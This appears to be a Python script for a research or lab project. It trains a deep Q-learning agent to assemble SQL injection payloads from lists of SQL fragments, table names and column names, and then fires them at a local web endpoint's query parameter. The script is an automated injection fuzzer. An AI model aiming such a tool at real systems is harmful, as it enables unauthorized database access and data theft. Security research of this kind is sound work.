import numpy as np
import requests
from rl.pre_training_environment import PreTrainingEnvironment
from rl.dqn import DQN
from enums.special_action import SpecialAction
from rl.environment import Environment
from rl.server_environment import ServerEnvironment
from rl.models.epsilon_model import EpsilonModel
from rl.models.rl_hyperparameters_model import RLHyperparametersModel

feature_count = 20

visible_chars = [chr(i) for i in range(32, 127)]
numbers = [str(i) for i in range(0, 10)]

with open('sql_list.txt', 'r') as f:
    data = f.read()
f.close()

sql_list = data.split('\n')

with open('tables.txt', 'r') as f:
    data = f.read()
f.close()

tables = list(map(lambda table: table + ' ', data.split('\n')))

with open('columns.txt', 'r') as f:
    data = f.read()
f.close()

columns = list(map(lambda column: column + ' ', data.split('\n')))

# sql_list must account for the leading segment of the action space.
#
# This is due to the pre-processing of existing SQL injections for
# pretraining.
mutation_actions = sql_list + numbers + tables + columns

# Half of action space terminates to prefer smaller queries, which implies
# more payloads executed.
terminating_actions = [SpecialAction.TERMINATE for _ in range(len(mutation_actions))]

# The termination actions must be in the suffix of the actions space,
# as to correctly set the action mask with __toggle_termination_mask.
actions = mutation_actions + terminating_actions

injected_payloads = []

terminated = False
state: np.ndarray

environment: Environment

def __toggle_termination_mask(set_mask: bool):
    if(set_mask):
        dqn.available_actions_range = range(len(mutation_actions))
    else:
        dqn.available_actions_range = range(len(actions))

def __toggle_environment(is_pre_training: bool):
    '''
    Must be called before running DQN.

    `state` must be defined before calling this function.
    '''
    global environment

    environment = PreTrainingEnvironment(dqn, actions, len(state)) \
        if is_pre_training \
        else ServerEnvironment(dqn, actions, lambda payload: requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}'))
        #res = requests.post('http://localhost.proxyman.io:3000/rest/user/login', data={
        #    'email': payload
        #})

def __perform_action(action_index: int, environment: Environment):
    global state

    action = actions[action_index]

    if(action == SpecialAction.TERMINATE):
        # Update the mask to account for potentially appended actions
        # and to prevent immediate termination action of an empty state.
        __toggle_termination_mask(True)
        
        res = environment.perform_termination_action(state)
        state = res[0]
        return res
    
    res = environment.perform_mutation_action(action_index, state)
    state = res[0]

    attempted = environment.payload_attempted(state)
    __toggle_termination_mask(attempted)

    return res

dqn = DQN(
    hyperparameters = RLHyperparametersModel(
        gamma=0.999,
        learning_rate=0.001,
        batch_size=2048,
        training_episodes=30000,
        test_episodes=10000,
        max_steps_per_episode=100,
        feature_count=feature_count,
        action_count=len(actions)
    ),
    epsilon_config = EpsilonModel(
        start=1.0,
        min=0.1,
        max=1.0,
        random_frame_count=1000,
        greedy_frame_count=10000
    ),
    available_actions_range = range(len(actions)),
    perform_action_callback = lambda action_index: __perform_action(action_index, environment),
    pre_training_completed_callback = lambda: __toggle_environment(is_pre_training=False)
)

state = dqn.create_empty_state()

__toggle_environment(is_pre_training=True)

model, model_target = dqn.create_model()
dqn.run(model, model_target)